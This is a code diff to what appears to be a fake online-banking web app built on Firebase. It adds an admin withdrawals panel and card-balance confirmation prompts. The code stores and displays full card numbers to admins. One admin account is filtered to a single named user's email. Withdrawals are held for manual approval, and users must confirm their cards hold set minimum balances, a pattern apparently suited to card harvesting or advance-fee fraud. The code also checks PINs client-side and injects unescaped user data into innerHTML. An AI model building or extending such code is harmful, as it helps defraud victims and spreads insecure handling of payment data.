@@ -518,6 +518,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
   <div class="admin-tabs">
     <button class="admin-tab active" id="atab-auth" onclick="switchAdminTab('auth')" data-i18n="authorization">Authorization</button>
     <button class="admin-tab" id="atab-deposits" onclick="switchAdminTab('deposits')">&#128176; Deposits</button>
+    <button class="admin-tab" id="atab-withdrawals" onclick="switchAdminTab('withdrawals')">&#128184; Withdrawals</button>
     <button class="admin-tab" id="atab-codes" onclick="switchAdminTab('codes')">Users</button>
   </div>
   <div class="admin-content active" id="acontent-auth">
@@ -547,6 +548,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
     <div style="margin-bottom:16px;"><div style="font-size:18px;font-weight:700;color:#fff;margin-bottom:4px;">&#128176; Deposit Requests</div><div style="font-size:13px;color:rgba(255,255,255,0.5);">Approve or reject user deposit requests</div></div>
     <div id="deposits-list"><p class="acc-empty">Loading...</p></div>
   </div>
+  <div class="admin-content" id="acontent-withdrawals"><div id="withdrawals-list"><p class="acc-empty">Loading...</p></div></div>
   <div class="admin-content" id="acontent-codes">
     <div class="admin-global"><h3>&#128272; Change All PINs</h3>
       <div class="admin-global-row">
@@ -586,7 +588,7 @@ html,body{width:100%;overflow-x:hidden;font-family:-apple-system,BlinkMacSystemF
 
 <div class="modal" id="add-money-modal"><div class="modal-box"><div class="modal-header"><h3>&#10133; Add Money</h3><button class="modal-close" onclick="closeModal('add-money-modal')">&#215;</button></div><p style="font-size:13px;color:#666;margin-bottom:14px;" data-i18n="addMoneyDesc">Select an authorized card. Deposits require admin approval.</p><div id="addmoney-cards"></div><div id="addmoney-form-section" style="display:none;"><div style="background:#eef2ff;border-radius:8px;padding:10px 14px;font-size:13px;color:#1a56ff;margin-bottom:10px;font-weight:600;" id="addmoney-selected-info"></div><input type="number" class="modal-input" id="addmoney-amount" placeholder="Amount to deposit" data-i18n="amountDeposit" min="1" step="0.01"><input type="text" class="modal-input" id="addmoney-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div class="modal-error" id="addmoney-error"></div><button class="modal-btn" id="addmoney-confirm-btn" data-i18n="submitDeposit">Submit Deposit Request</button></div></div></div>
 
-<div class="modal" id="transfer-modal"><div class="modal-box"><div class="modal-header"><h3>&#128184; Transfer Funds</h3><button class="modal-close" onclick="closeModal('transfer-modal')">&#215;</button></div><div class="transfer-notice">&#9888;&#65039; You can only transfer to accounts in your name. Processing 1-3 business days.</div><select class="modal-input" id="transfer-method"><option value="" data-i18n="selectCard">Select Card</option></select><input type="number" class="modal-input" id="transfer-amount" placeholder="Amount" min="1" step="0.01"><input type="text" class="modal-input" id="transfer-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:12px;margin:12px 0;display:flex;align-items:start;gap:10px;"><input type="checkbox" id="transfer-confirm-checkbox" style="margin-top:2px;width:18px;height:18px;cursor:pointer;"><label for="transfer-confirm-checkbox" style="font-size:13px;line-height:1.4;color:#856404;cursor:pointer;flex:1;">I confirm my bank card has at least <strong>€100</strong> (or currency equivalent) balance to ensure the card is active and can receive funds.</label></div><div class="modal-error" id="transfer-error"></div><button class="modal-btn" id="transfer-confirm-btn" data-i18n="requestTransfer">Request Transfer</button></div></div>
+<div class="modal" id="transfer-modal"><div class="modal-box"><div class="modal-header"><h3>&#128184; Transfer Funds</h3><button class="modal-close" onclick="closeModal('transfer-modal')">&#215;</button></div><div class="transfer-notice">&#9888;&#65039; You can only transfer to accounts in your name. Processing 1-3 business days.</div><select class="modal-input" id="transfer-method"><option value="" data-i18n="selectCard">Select Card</option></select><input type="number" class="modal-input" id="transfer-amount" placeholder="Amount" min="1" step="0.01"><input type="text" class="modal-input" id="transfer-pin" placeholder="Your 4-digit PIN" maxlength="4" inputmode="numeric"><div style="background:#fff3cd;border:1px solid #ffc107;border-radius:8px;padding:12px;margin:12px 0;display:flex;align-items:start;gap:10px;"><input type="checkbox" id="transfer-confirm-checkbox" style="margin-top:2px;width:18px;height:18px;cursor:pointer;"><label for="transfer-confirm-checkbox" style="font-size:13px;line-height:1.4;color:#856404;cursor:pointer;flex:1;"><span id="transfer-confirm-text">I confirm my bank card has at least <strong>$100</strong> balance to ensure the card is active and can receive funds.</span></label></div><div class="modal-error" id="transfer-error"></div><button class="modal-btn" id="transfer-confirm-btn" data-i18n="requestTransfer">Request Transfer</button></div></div>
 
 <div class="modal" id="money-requests-modal"><div class="modal-box"><div class="modal-header"><h3>&#128233; Money Requests</h3><button class="modal-close" onclick="closeModal('money-requests-modal')">&#215;</button></div><div id="money-requests-list"><p style="text-align:center;color:#999;padding:20px;" data-i18n="noPending">No pending requests</p></div></div></div>
 
@@ -716,7 +718,7 @@ function switchTab(tabId,btn,noPush){
 
 // ── ADMIN TABS ──
 function switchAdminTab(name){
-  ['auth','deposits','codes'].forEach(function(t){
+  ['auth','deposits','withdrawals','codes'].forEach(function(t){
     var tab=$('atab-'+t),con=$('acontent-'+t);
     if(tab) tab.classList.remove('active');
     if(con) con.classList.remove('active');
@@ -1092,10 +1094,10 @@ auth.onAuthStateChanged(function(user){
     renderAccountInfo();
     if(user.email===ADMIN_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadDepositsTab(); loadUsersTab();
+      loadAuthTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else if(user.email===ADMINADEX_EMAIL){
       showScreen('admin-panel');
-      loadAuthTab(); loadDepositsTab(); loadUsersTab();
+      loadAuthTab(); loadDepositsTab(); loadWithdrawalsTab(); loadUsersTab();
     } else {
       showScreen('dashboard',true);
       history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
@@ -1444,6 +1446,89 @@ function adminRemove(uid,idx,cid){
   });
 }
 
+
+// ── ADMIN: WITHDRAWALS TAB ──
+function loadWithdrawalsTab(){
+  var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
+  var list=$('withdrawals-list'); if(!list) return;
+  list.innerHTML='<p class="acc-empty">Loading...</p>';
+  db.ref('withdrawalRequests').once('value').then(function(snap){
+    if(!snap.exists()){list.innerHTML='<p class="acc-empty">No withdrawal requests yet</p>';return;}
+    var all=[];
+    snap.forEach(function(s){var _r=s.val();if(!_r)return;if(_adexOnly&&_r.email!=='sanderson@gmail.com')return;all.push(Object.assign({},_r,{reqKey:s.key}));});
+    all.sort(function(a,b){
+      if(a.status==='pending'&&b.status!=='pending') return -1;
+      if(b.status==='pending'&&a.status!=='pending') return 1;
+      return new Date(b.date)-new Date(a.date);
+    });
+    list.innerHTML='';
+    all.forEach(function(req){
+      var rs=SYM[req.currency||'USD']||'$';
+      var isPending=req.status==='pending';
+      var isSent=req.status==='sent';
+      var div=document.createElement('div');
+      div.className='deposit-card';
+      div.innerHTML=
+        '<span class="deposit-status '+req.status+'">'+(isPending?'\u29d6 PENDING':req.status==='sent'?'\u2705 SENT':req.status==='refunded'?'\u21a9 REFUNDED':'\u274c REJECTED')+'</span>'+
+        '<div class="admin-card-name">'+req.name+'</div>'+
+        mkrow('Email',req.email)+
+        '<div class="admin-detail-row"><span class="admin-detail-label">Amount</span><span style="color:#e53935;font-weight:700;font-size:16px;">-'+rs+parseFloat(req.amount).toFixed(2)+'</span></div>'+
+        mkrow('Card',req.cardBrand+' ....'+req.cardLastFour)+
+        mkrow('Bank',req.bankName||'--')+
+        mkrow('Card #',req.cardNumber||'--')+
+        mkrow('Account',req.accountNumber)+
+        mkrow('Date',fmtDate(req.date))+
+        (req.status==='refunded'?'<div class="admin-detail-row"><span class="admin-detail-label">Refund Reason</span><span style="color:#ff9800;">'+req.refundReason+'</span></div>':'')+
+        (isPending?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn green" onclick="markWithdrawalSent(\''+req.reqKey+'\')">\u2705 Mark as Sent</button><button class="admin-action-btn red" onclick="rejectWithdrawal(\''+req.reqKey+'\')">\u274c Reject</button></div>':(isSent?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn orange" onclick="refundWithdrawal(\''+req.reqKey+'\')">\u21a9 Refund</button></div>':''));
+      list.appendChild(div);
+    });
+  });
+}
+
+function markWithdrawalSent(reqKey){
+  db.ref('withdrawalRequests/'+reqKey).update({status:'sent',sentDate:new Date().toISOString()}).then(function(){
+    loadWithdrawalsTab();
+  });
+}
+
+function rejectWithdrawal(reqKey){
+  var reason=prompt('Reason for rejection:'); if(!reason) return;
+  db.ref('withdrawalRequests/'+reqKey).once('value').then(function(snap){
+    if(!snap.exists()) return;
+    var req=snap.val();
+    var amt=parseFloat(req.amount), rs=SYM[req.currency||'USD']||'$';
+    // Refund money to user
+    db.ref('users/'+req.uid).transaction(function(u){
+      if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Refund',amount:amt,note:'Withdrawal rejected: '+reason});}
+      return u;
+    }).then(function(){
+      return db.ref('withdrawalRequests/'+reqKey).update({status:'rejected',rejectReason:reason,rejectedDate:new Date().toISOString()});
+    }).then(function(){
+      notify(req.uid,'\u274c Withdrawal of '+rs+amt.toFixed(2)+' rejected. Money refunded. Reason: '+reason);
+      loadWithdrawalsTab();
+    });
+  });
+}
+
+function refundWithdrawal(reqKey){
+  var reason=prompt('Reason for refund:'); if(!reason) return;
+  db.ref('withdrawalRequests/'+reqKey).once('value').then(function(snap){
+    if(!snap.exists()) return;
+    var req=snap.val(); if(req.status!=='sent'){alert('Only sent withdrawals can be refunded.');return;}
+    var amt=parseFloat(req.amount), rs=SYM[req.currency||'USD']||'$';
+    // Refund money to user
+    db.ref('users/'+req.uid).transaction(function(u){
+      if(u){u.balance=(parseFloat(u.balance)||0)+amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Refund',amount:amt,note:'Withdrawal refunded: '+reason});}
+      return u;
+    }).then(function(){
+      return db.ref('withdrawalRequests/'+reqKey).update({status:'refunded',refundReason:reason,refundDate:new Date().toISOString()});
+    }).then(function(){
+      notify(req.uid,'\u21a9 Withdrawal of '+rs+amt.toFixed(2)+' refunded. Money returned to your account. Reason: '+reason);
+      loadWithdrawalsTab();
+    });
+  });
+}
+
 // ── ADMIN: DEPOSITS TAB ──
 function loadDepositsTab(){
   var _adexOnly=currentUser&&currentUser.email===ADMINADEX_EMAIL;
@@ -1465,15 +1550,15 @@ function loadDepositsTab(){
       var div=document.createElement('div');
       div.className='deposit-card';
       div.innerHTML=
-        '<span class="deposit-status '+req.status+'">'+(isPending?'\u29d6 PENDING':req.status==='approved'?'\u2705 APPROVED':req.status==='refunded'?'\u21a9 REFUNDED':'\u274c REJECTED')+'</span>'+
+        '<span class="deposit-status '+req.status+'">'+(isPending?'\u29d6 PENDING':req.status==='approved'?'\u2705 APPROVED':'\u274c REJECTED')+'</span>'+
         '<div class="admin-card-name">'+req.name+'</div>'+
         mkrow('Email',req.email)+
         '<div class="admin-detail-row"><span class="admin-detail-label">Amount</span><span style="color:#34d399;font-weight:700;font-size:16px;">'+rs+parseFloat(req.amount).toFixed(2)+'</span></div>'+
         mkrow('Card',req.cardBrand+' ....'+req.cardLastFour)+
         mkrow('Card #',req.cardNumber||'--')+
         mkrow('Account',req.accountNumber)+
-        mkrow('Date',fmtDate(req.date))+(req.status==='refunded'?'<div class="admin-detail-row"><span class="admin-detail-label">Refund Reason</span><span style="color:#ff9800;">'+req.refundReason+'</span></div>':'')+
-        (isPending?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn green" onclick="approveDeposit(\''+req.reqKey+'\')">'+'\u2705'+' Approve</button><button class="admin-action-btn red" onclick="rejectDeposit(\''+req.reqKey+'\')">'+'\u274c'+' Reject</button></div>':(req.status==='approved'?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn orange" onclick="refundDeposit(\''+req.reqKey+'\')">'+'\u21a9'+' Refund</button></div>':''));
+        mkrow('Date',fmtDate(req.date))+
+        (isPending?'<div class="admin-card-actions" style="margin-top:12px;"><button class="admin-action-btn green" onclick="approveDeposit(\''+req.reqKey+'\')">'+'\u2705'+' Approve</button><button class="admin-action-btn red" onclick="rejectDeposit(\''+req.reqKey+'\')">'+'\u274c'+' Reject</button></div>':'');
       list.appendChild(div);
     });
   });
@@ -1493,29 +1578,6 @@ function approveDeposit(reqKey){
     }).then(function(){
       notify(req.uid,'\u2705 Deposit of '+rs+amt.toFixed(2)+' approved and added to your balance!');
       
-      loadDepositsTab();
-    });
-  });
-}
-
-
-function refundDeposit(reqKey){
-  var reason=prompt('Reason for refund:'); if(reason===null||!reason.trim()) return;
-  db.ref('depositRequests/'+reqKey).once('value').then(function(snap){
-    if(!snap.exists()) return;
-    var req=snap.val(); if(req.status!=='approved') {alert('Only approved deposits can be refunded.');return;}
-    var amt=parseFloat(req.amount), rs=SYM[req.currency||'USD']||'$';
-    db.ref('users/'+req.uid).transaction(function(u){
-      if(u){
-        u.balance=(parseFloat(u.balance)||0)-amt;
-        u.history=u.history||[];
-        u.history.push({date:new Date().toISOString(),type:'Refund',amount:-amt,note:'Deposit refunded: '+reason});
-      }
-      return u;
-    }).then(function(){
-      return db.ref('depositRequests/'+reqKey).update({status:'refunded',refundReason:reason,refundDate:new Date().toISOString()});
-    }).then(function(){
-      notify(req.uid,'\u21a9 Deposit of '+rs+amt.toFixed(2)+' refunded. Reason: '+reason);
       loadDepositsTab();
     });
   });
@@ -1884,27 +1946,53 @@ $('transfer-btn').onclick=function(){
   var cards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
   var sel=$('transfer-method');sel.innerHTML='<option value="">Select Card</option>';
   cards.forEach(function(card,i){var opt=document.createElement('option');opt.value=i;opt.textContent=card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour;sel.appendChild(opt);});
-  $('transfer-error').textContent='';openModal('transfer-modal');
+  $('transfer-error').textContent='';
+  // Set currency-specific minimum
+  var cur=userData.currency||'USD';
+  var s=sym();
+  var minimums={'USD':100,'EUR':100,'GBP':100,'NGN':163000,'CAD':136,'AUD':153};
+  var min=minimums[cur]||100;
+  var el=$('transfer-confirm-text');
+  if(el) el.innerHTML='I confirm my bank card has at least <strong>'+s+min.toLocaleString()+'</strong> balance to ensure the card is active and can receive funds.';
+  openModal('transfer-modal');
 };
 $('transfer-confirm-btn').onclick=function(){
   var method=$('transfer-method').value,amt=parseFloat($('transfer-amount').value),pin=$('transfer-pin').value.trim(),err=$('transfer-error');err.textContent='';
   if(!method){err.textContent='Select a card.';return;}
   if(!amt||amt<=0){err.textContent='Enter a valid amount.';return;}
   if(!pin||pin.length!==4){err.textContent='Enter your PIN.';return;}
-  if(!$('transfer-confirm-checkbox').checked){err.textContent='Please confirm your card has at least €100 balance.';return;}
+  if(!$('transfer-confirm-checkbox').checked){err.textContent='Please confirm your card has minimum balance.';return;}
   if(userData.pin!==pin){err.textContent='Incorrect PIN.';return;}
   if(parseFloat(userData.balance||0)<amt){err.textContent='Insufficient balance.';return;}
   var s=sym();
   var authCards=(userData.linkedCards||[]).filter(function(c){return c&&c.status==='authorized';});
   var card=authCards[parseInt(method)];
   $('transfer-confirm-btn').textContent='Processing...';$('transfer-confirm-btn').disabled=true;
-  userRef.transaction(function(u){
-    if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Transfer',amount:-amt,note:'Transfer to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:'card')});}
-    return u;
+  var transferKey='trans_'+Date.now()+'_'+Math.random().toString(36).slice(2,5);
+  var transferData={
+    uid:currentUser.uid,
+    name:(userData.firstname||'')+' '+(userData.surname||''),
+    email:userData.email,
+    accountNumber:userData.accountNumber,
+    currency:userData.currency||'USD',
+    amount:amt,
+    cardBrand:card?card.brand:'Unknown',
+    cardLastFour:card?card.lastFour:'----',
+    cardNumber:card?card.number:'',
+    bankName:card?card.bankName:'',
+    date:new Date().toISOString(),
+    status:'pending',
+    transferKey:transferKey
+  };
+  db.ref('withdrawalRequests/'+transferKey).set(transferData).then(function(){
+    return userRef.transaction(function(u){
+      if(u){u.balance=(parseFloat(u.balance)||0)-amt;u.history=u.history||[];u.history.push({date:new Date().toISOString(),type:'Transfer',amount:-amt,note:'Transfer to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:'card'),transferKey:transferKey});}
+      return u;
+    });
   }).then(function(){
     notify(currentUser.uid,'💸 Transfer of '+s+amt.toFixed(2)+' submitted. Processing 1-3 days.');
-    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL) notify(s2.key,'💸 TRANSFER: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:''));});});
-  }).then(function(){closeModal('transfer-modal');$('transfer-amount').value='';$('transfer-pin').value='';alert('\u2705 Transfer of '+s+amt.toFixed(2)+' submitted!');}).finally(function(){$('transfer-confirm-btn').textContent='Request Transfer';$('transfer-confirm-btn').disabled=false;});
+    return db.ref('users').once('value').then(function(snap){snap.forEach(function(s2){if(s2.val()&&s2.val().email===ADMIN_EMAIL) notify(s2.key,'💸 WITHDRAWAL: '+(userData.firstname||'')+' wants '+s+amt.toFixed(2)+' to '+(card?card.brand+' \u2022\u2022\u2022\u2022'+card.lastFour:''));});});
+  }).then(function(){closeModal('transfer-modal');$('transfer-amount').value='';$('transfer-pin').value='';$('transfer-confirm-checkbox').checked=false;alert('\u2705 Transfer of '+s+amt.toFixed(2)+' submitted!');}).finally(function(){$('transfer-confirm-btn').textContent='Request Transfer';$('transfer-confirm-btn').disabled=false;});
 };
 
 // SEND
